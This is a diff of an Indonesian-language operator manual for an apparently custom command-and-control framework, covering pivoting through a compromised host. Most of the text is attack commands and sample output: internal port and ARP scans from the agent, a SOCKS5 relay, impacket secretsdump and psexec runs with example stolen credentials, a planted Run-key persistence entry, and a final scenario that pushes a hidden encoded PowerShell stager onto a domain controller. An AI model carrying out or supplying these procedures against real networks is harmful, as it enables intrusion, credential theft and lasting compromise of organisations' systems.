@@ -2,283 +2,353 @@
 
 ## Konsep Pivoting
 
-Pivoting = menggunakan mesin yang sudah kita kendalikan (agent) sebagai "jembatan"
-untuk mengakses jaringan internal yang tidak bisa diakses langsung dari mesin operator.
+Pivoting = menggunakan mesin yang sudah dikuasai (agent) sebagai "jembatan"
+untuk menjangkau segmen jaringan internal yang tidak bisa diakses langsung dari luar.
 
 ```
-[Operator]                [Target/Agent]             [Internal Network]
-172.23.0.118      ──────► 192.168.1.50      ──────►  10.0.0.0/24
-(internet)                (DMZ/compromised)           (tidak bisa diakses langsung)
+[Operator] ──► [Internet] ──► [C2 Server] ──► [Agent (DMZ)] ──► [Internal Network]
+                                                                    └─► 10.10.5.0/24
+                                                                    └─► 192.168.100.0/24
+                                                                    └─► DC, Database, dsb
 ```
 
 ---
 
-## Network Scan
+## Port Scan (NetScan)
 
-### TCP Port Scan — `netscan`
+Scan port TCP ke satu atau beberapa target dari posisi agent. Berguna untuk
+network discovery setelah masuk ke internal network.
 
-Jalankan port scan dari posisi jaringan agent. Berguna untuk memetakan host dan service
-di jaringan internal yang tidak bisa kamu scan langsung dari internet.
+### Syntax
 
 ```
-taburtuai(IP:PORT) › netscan 2703886d \
+netscan <agent-id> --targets <target> [--ports <port-list>] [--timeout <sec>] [--workers <n>]
+```
+
+### Scan Subnet Untuk Target Umum
+
+```
+taburtuai(IP:8000) › netscan 2703886d \
   --targets 192.168.1.0/24 \
-  --ports 22,80,443,3389,445,8080,8443 \
+  --ports 22,80,443,445,3389,8080,8443 \
+  --timeout 2 \
+  --workers 100 \
   --wait
 ```
 
+**Output:**
 ```
-[+] Network scan started: 192.168.1.0/24 (256 hosts, 7 ports)
+[*] Starting TCP port scan from DESKTOP-QLPBF95...
+[*] Targets : 192.168.1.0/24 (256 hosts)
+[*] Ports   : 22, 80, 443, 445, 3389, 8080, 8443
+[*] Workers : 100 goroutines
+[*] Timeout : 2 seconds per probe
 
-192.168.1.1   :80    OPEN   HTTP
-192.168.1.1   :443   OPEN   HTTPS
-192.168.1.10  :22    OPEN   SSH
-192.168.1.50  :3389  OPEN   RDP      ← target kita sendiri
-192.168.1.100 :445   OPEN   SMB
-192.168.1.100 :3389  OPEN   RDP
-192.168.1.100 :80    OPEN   HTTP
-192.168.1.200 :80    OPEN   HTTP
-192.168.1.200 :8080  OPEN   HTTP
+[+] Scan completed (47.3s):
 
-[+] Scan complete. 9 open ports found on 4 hosts.
+HOST             PORT   STATUS   BANNER
+---------------  -----  -------  ------------------------------------------
+192.168.1.1      80     open     HTTP/1.1 200 (Router Admin)
+192.168.1.1      443    open     HTTPS
+192.168.1.10     22     open     SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
+192.168.1.10     80     open     HTTP/1.1 302 → https://...
+192.168.1.10     443    open     HTTPS
+192.168.1.10     3389   open     
+192.168.1.50     445    open     [SMB] FILESERVER-01 (Windows Server 2022)
+192.168.1.50     3389   open     
+192.168.1.100    445    open     [SMB] DC01 (Windows Server 2022)
+192.168.1.100    80     open     HTTP (AD CS)
+192.168.1.100    443    open     HTTPS (AD CS)
+192.168.1.105    445    open     [SMB] DESKTOP-QLPBF95 (Windows 11)
+192.168.1.200    22     open     SSH-2.0-OpenSSH_9.0
+192.168.1.200    80     open     HTTP/1.1 200 Apache/2.4.54
+
+[+] 14 open ports found across 7 hosts.
+[i] 249 hosts: no response (filtered/closed)
 ```
 
-### Opsi Scan
+### Scan Beberapa Target Berbeda
 
 ```
-# Scan multiple subnet
-netscan 2703886d --targets 10.0.0.0/24 --targets 192.168.1.0/24 --ports 22,80,443
-
-# Scan target spesifik
-netscan 2703886d --targets 192.168.1.100 --ports 1-1024
-
-# Dengan banner grabbing (identifikasi service)
-netscan 2703886d --targets 192.168.1.0/24 --ports 80,443,22 --banners --wait
-
-# Dengan timeout per port
-netscan 2703886d --targets 10.0.0.0/24 --ports 80,443 --timeout 2 --wait
+taburtuai(IP:8000) › netscan 2703886d \
+  --targets 10.10.5.0/24,172.16.0.0/24 \
+  --ports 22,80,443,3389,5985,8080 \
+  --wait
 ```
 
-### Dengan Banner Grabbing
+### Scan Satu Host dengan Port Penuh
 
 ```
-taburtuai(IP:PORT) › netscan 2703886d \
+taburtuai(IP:8000) › netscan 2703886d \
   --targets 192.168.1.100 \
-  --ports 22,80,443,8080 \
-  --banners \
+  --ports 1-65535 \
+  --timeout 1 \
+  --workers 500 \
   --wait
 ```
 
+**Output:**
 ```
-192.168.1.100 :22    OPEN   SSH     - SSH-2.0-OpenSSH_8.9p1 Ubuntu-3
-192.168.1.100 :80    OPEN   HTTP    - Apache/2.4.52 (Ubuntu)
-192.168.1.100 :443   OPEN   HTTPS   - Apache/2.4.52 (Ubuntu)
-192.168.1.100 :8080  OPEN   HTTP    - Tomcat/9.0.58
+[*] Scanning 192.168.1.100 (65535 ports)...
+[+] Scan completed (139.2s):
+
+HOST             PORT   STATUS   BANNER
+192.168.1.100    53     open     DNS
+192.168.1.100    80     open     HTTP
+192.168.1.100    88     open     Kerberos
+192.168.1.100    135    open     MS-RPC
+192.168.1.100    139    open     NetBIOS
+192.168.1.100    389    open     LDAP
+192.168.1.100    443    open     HTTPS
+192.168.1.100    445    open     SMB
+192.168.1.100    464    open     Kerberos password
+192.168.1.100    593    open     RPC over HTTP
+192.168.1.100    636    open     LDAPS
+192.168.1.100    3268   open     Global Catalog LDAP
+192.168.1.100    3269   open     Global Catalog LDAPS
+192.168.1.100    3389   open     RDP
+192.168.1.100    5985   open     WinRM HTTP
+192.168.1.100    49152  open     RPC dynamic
+...
+
+[i] Teridentifikasi sebagai: Windows Server 2022 — kemungkinan Domain Controller
+```
+
+### Scan dengan Banner Grabbing
+
+```
+taburtuai(IP:8000) › netscan 2703886d \
+  --targets 192.168.1.0/24 \
+  --ports 22,80,21,25,110 \
+  --grab-banners \
+  --wait
 ```
 
 ---
 
 ## ARP Scan
 
-Temukan semua host di subnet yang sama dengan agent tanpa melakukan port scan.
-ARP scan jauh lebih cepat dan tidak terdeteksi seperti port scan.
-
-### `arpscan <id>`
+Dump ARP table di mesin agent. Lebih cepat dari port scan karena hanya membaca
+tabel ARP yang sudah ada di OS — tidak mengirim traffic baru ke network.
 
 ```
-taburtuai(IP:PORT) › arpscan 2703886d --wait
+taburtuai(IP:8000) › arpscan 2703886d --wait
 ```
 
+**Output:**
 ```
-[+] ARP scan on 192.168.1.0/24...
+[*] Reading ARP table from DESKTOP-QLPBF95...
+[+] ARP table (14 entries):
 
-IP              MAC                VENDOR
-------------------------------------------------
-192.168.1.1     aa:bb:cc:dd:ee:ff  Cisco Systems
-192.168.1.10    11:22:33:44:55:66  Dell Technologies
-192.168.1.50    77:88:99:aa:bb:cc  VMware (target kita)
-192.168.1.100   dd:ee:ff:11:22:33  HP Enterprise
-192.168.1.200   44:55:66:77:88:99  Raspberry Pi Foundation
-
-[+] 5 hosts found.
+IP ADDRESS       MAC ADDRESS         INTERFACE     TYPE
+---------------  ------------------  ------------  ----------
+192.168.1.1      00:50:56:89:ab:cd   Ethernet      Dynamic
+192.168.1.10     00:0c:29:12:34:56   Ethernet      Dynamic
+192.168.1.50     00:0c:29:78:9a:bc   Ethernet      Dynamic
+192.168.1.100    00:50:56:aa:bb:cc   Ethernet      Dynamic
+192.168.1.105    00:11:22:33:44:55   Ethernet      Static (self)
+192.168.1.200    00:0c:29:de:f0:12   Ethernet      Dynamic
+224.0.0.22       01:00:5e:00:00:16   Ethernet      Static
+224.0.0.251      01:00:5e:00:00:fb   Ethernet      Static
+255.255.255.255  ff:ff:ff:ff:ff:ff   Ethernet      Static
 ```
 
-### Dengan Subnet Spesifik
-
-```
-arpscan 2703886d --subnet 10.0.0.0/24 --wait
-```
+**Gunakan untuk:**
+- Identifikasi host aktif tanpa mengirim probe (stealth)
+- Identifikasi vendor berdasarkan MAC OUI
+- Temukan host yang mungkin tidak merespons ping (firewall ICMP)
 
 ---
 
-## SOCKS5 Proxy
+## SOCKS5 Proxy Pivot
 
-Buat SOCKS5 proxy yang berjalan di mesin operator, dengan traffic diforward melalui
-agent. Ini memungkinkan kamu menggunakan tool apa pun (browser, nmap, impacket, dll)
-untuk mengakses jaringan internal target secara transparan.
-
-### Start SOCKS5 Proxy
+Instruksikan agent untuk membuka listener SOCKS5 di dirinya sendiri. Operator
+kemudian menggunakan SOCKS5 client (proxychains, Burp, browser) untuk mengakses
+network internal melalui agent sebagai relay.
 
 ```
-taburtuai(IP:PORT) › socks5 start 2703886d --port 1080 --wait
+Operator ──► C2 Server ──► Agent ──┬──► 192.168.1.100 (DC)
+                                    ├──► 192.168.1.50  (File Server)
+                                    └──► 10.10.5.0/24  (Internal VLAN)
 ```
 
-```
-[+] SOCKS5 proxy started.
-    Agent     : 2703886d (192.168.1.50)
-    Listen    : 127.0.0.1:1080
-    
-[*] Configure your tools to use SOCKS5 proxy at 127.0.0.1:1080
-```
-
-### Status Proxy
+### Start SOCKS5
 
 ```
-taburtuai(IP:PORT) › socks5 status 2703886d
+taburtuai(IP:8000) › socks5 start 2703886d --wait
 ```
 
+**Output:**
+```
+[*] Starting SOCKS5 proxy on DESKTOP-QLPBF95...
+[+] SOCKS5 listener started.
+
+    Listen address: 127.0.0.1:1080
+    Protocol      : SOCKS5 (no auth)
+    Note          : Accessible via C2 tunnel
+
+[i] Konfigurasi proxychains:
+    socks5 127.0.0.1 1080
+```
+
+### Start dengan Alamat Kustom
+
+```
+taburtuai(IP:8000) › socks5 start 2703886d --addr 0.0.0.0:9050 --wait
+# SOCKS5 bind ke semua interface port 9050
+```
+
+### Cek Status SOCKS5
+
+```
+taburtuai(IP:8000) › socks5 status 2703886d --wait
+```
+
+**Output:**
 ```
 [+] SOCKS5 proxy status:
-    State      : running
-    Port       : 1080
+
+    Running   : YES
+    Listen    : 127.0.0.1:1080
     Connections: 3 active
-    Transferred: 14.2 MB
+    Bytes in  : 1,247,830
+    Bytes out : 8,341,204
 ```
 
-### Stop Proxy
+### Stop SOCKS5
 
 ```
-taburtuai(IP:PORT) › socks5 stop 2703886d --wait
-[+] SOCKS5 proxy stopped.
+taburtuai(IP:8000) › socks5 stop 2703886d --wait
+# [+] SOCKS5 proxy stopped. All active connections closed.
 ```
 
 ---
 
-## Menggunakan SOCKS5 dengan Tool Lain
+## Menggunakan SOCKS5 Proxy
 
-Setelah SOCKS5 aktif, konfigurasikan tool kamu:
-
-### Browser (Firefox)
-
-```
-Preferences → Network Settings → Manual proxy configuration
-  SOCKS Host: 127.0.0.1
-  Port      : 1080
-  SOCKS v5  : ✓
-```
-
-Sekarang bisa akses `http://192.168.1.100` (internal server) dari browser.
-
-### Nmap via Proxychains
+### Proxychains
 
 ```bash
-# Edit /etc/proxychains4.conf
+# Konfigurasi /etc/proxychains4.conf
 echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
 
-# Scan internal network via agent
-proxychains nmap -sT -p 80,443,3389,445 192.168.1.100
-proxychains nmap -sT -p 1-65535 192.168.1.100 --open
+# Akses host internal melalui agent
+proxychains nmap -sT -p 80,443,445 192.168.1.100
+proxychains curl http://192.168.1.100/
+proxychains ssh admin@192.168.1.10
+proxychains python3 -m impacket.examples.secretsdump CORP/john.doe:P@ss@192.168.1.100
 ```
 
-### Impacket (Pass-the-Hash, SMB, dll)
+### Nmap melalui SOCKS5
 
 ```bash
-# SMB enumeration via proxy
-proxychains impacket-smbclient DOMAIN/administrator:Password@192.168.1.100
-
-# PsExec lateral movement via proxy
-proxychains impacket-psexec DOMAIN/administrator:Password@192.168.1.100
-
-# Secretsdump via proxy
-proxychains impacket-secretsdump DOMAIN/administrator:Password@192.168.1.100
-
-# Pass-the-Hash via proxy
-proxychains impacket-psexec -hashes :NTLM_HASH DOMAIN/administrator@192.168.1.100
+proxychains nmap -sT -p 1-1000 -T4 --open 192.168.1.0/24 2>/dev/null
 ```
 
-### CrackMapExec
-
-```bash
-# SMB scan via proxy
-proxychains cme smb 192.168.1.0/24
-
-# Dump SAM via proxy
-proxychains cme smb 192.168.1.100 -u administrator -p Password -M lsassy
-
-# Pass-the-hash
-proxychains cme smb 192.168.1.100 -u administrator -H NTLM_HASH
+**Output:**
+```
+Nmap scan report for 192.168.1.100 (DC01)
+PORT    STATE SERVICE
+53/tcp  open  domain
+80/tcp  open  http
+88/tcp  open  kerberos-sec
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds
 ```
 
-### RDP (xfreerdp)
+### Browser melalui SOCKS5
+
+Konfigurasi FoxyProxy atau browser proxy:
+- Type: SOCKS5
+- Host: 127.0.0.1
+- Port: 1080
+
+Setelah itu bisa akses `http://192.168.1.100/` (intranet) langsung dari browser.
+
+### Impacket melalui SOCKS5
 
 ```bash
-# RDP ke internal host via SOCKS5
-proxychains xfreerdp /v:192.168.1.100 /u:administrator /p:Password /dynamic-resolution
+# Credential dump dari DC via SOCKS5
+proxychains python3 -m impacket.examples.secretsdump \
+  CORP/john.doe:CorpMail@2026!@192.168.1.100
+
+# PsExec ke server internal
+proxychains python3 -m impacket.examples.psexec \
+  CORP/Administrator:Admin@Corp2026!@192.168.1.50
 ```
 
 ---
 
-## Registry Operations
+## Registry Operations (dari Pivot Point)
 
-Baca, tulis, dan manipulasi registry Windows dari jarak jauh.
+Setelah punya akses ke internal network via SOCKS5, bisa manipulasi registry di host lain
+melalui agent yang sudah masuk ke mesin berikutnya.
 
-### Baca Registry Key
-
-```
-# Baca key
-taburtuai(IP:PORT) › cmd 2703886d "reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-
-# Atau via dedicated command (Phase 11)
-reg read 2703886d --key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-```
-
-### Tulis Registry Key
+Atau operasi registry pada host agent itu sendiri:
 
 ```
-reg write 2703886d \
-  --key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
-  --name "WindowsUpdate" \
-  --value "C:\Users\windows\AppData\Roaming\update.exe" \
-  --type REG_SZ
+taburtuai(IP:8000) › registry read 2703886d \
+  --hive HKLM \
+  --key "SOFTWARE\Microsoft\Windows NT\CurrentVersion" \
+  --value ProductName
 ```
 
-### Hapus Registry Key
+**Output:**
+```
+[+] Registry value:
+    Path : HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName
+    Type : REG_SZ
+    Data : Windows 11 Home
+```
 
 ```
-reg delete 2703886d \
-  --key "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
-  --name "WindowsUpdate"
+taburtuai(IP:8000) › registry list 2703886d \
+  --hive HKLM \
+  --key "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 ```
 
-### List Subkey
+**Output:**
+```
+[+] Registry subkeys and values:
 
+    HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    │
+    ├── [VALUE] SecurityHealth     = C:\Windows\system32\SecurityHealthSystray.exe
+    ├── [VALUE] OneDrive           = "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
+    └── [VALUE] WindowsSecurityUpdate = C:\Users\...\WindowsSecurityUpdate.exe   ← kita punya
 ```
-reg list 2703886d --key "HKCU\Software\Microsoft"
-```
+
+Lihat [15 — Advanced Techniques](15-advanced.md) untuk operasi registry lengkap.
 
 ---
 
-## Scenario: Lateral Movement via SOCKS5
+## Skenario Pivoting: Lateral Movement ke Domain Controller
 
-```bash
-# 1. Compromise initial target, agent aktif
-# 2. Enumerate jaringan internal dari posisi agent
-netscan 2703886d --targets 10.0.0.0/24 --ports 445,3389,22 --wait
+```
+# ── Recon dari agent pertama ──────────────────────────────
+netscan 2703886d --targets 192.168.1.0/24 --ports 445,3389,5985 --wait
 
-# 3. Identifikasi target menarik (misal: 10.0.0.100 dengan port 445 open)
+# Temukan DC di 192.168.1.100
 
-# 4. Start SOCKS5 proxy
-socks5 start 2703886d --port 1080
+# ── Start SOCKS5 di agent ─────────────────────────────────
+socks5 start 2703886d --wait
 
-# 5. Gunakan credential yang sudah didapat untuk lateral movement
-proxychains impacket-secretsdump domain/admin:pass@10.0.0.100
+# ── Dari mesin operator via proxychains ───────────────────
+# Dump credential DC menggunakan token CORP\john.doe yang sudah didapat
+proxychains python3 -m impacket.examples.secretsdump \
+  CORP/john.doe:CorpMail@2026!@192.168.1.100
 
-# 6. Atau deploy agent baru ke target baru via SMB
-files upload 2703886d ./bin/agent_windows_stealth.exe "C:\Temp\update.exe"
-cmd 2703886d "copy C:\Temp\update.exe \\10.0.0.100\C$\Temp\update.exe"
+# Jika berhasil, deploy agent ke DC via SMB
+proxychains python3 -m impacket.examples.psexec \
+  CORP/Administrator:Admin@Corp2026!@192.168.1.100 \
+  cmd.exe /c "powershell -w hidden -enc <STAGER_B64>"
 
-# 7. Eksekusi agent di target baru via WMI/SCM
-cmd 2703886d "wmic /node:10.0.0.100 /user:domain\admin /password:pass process call create 'C:\Temp\update.exe'"
+# ── DC jadi agent baru di console ────────────────────────
+agents list
+# 2703886d  DESKTOP-QLPBF95  john.doe     online   5s ago
+# 4f1b8e23  DC01             SYSTEM       online   12s ago   ← agent baru di DC!
 ```
 
 ---
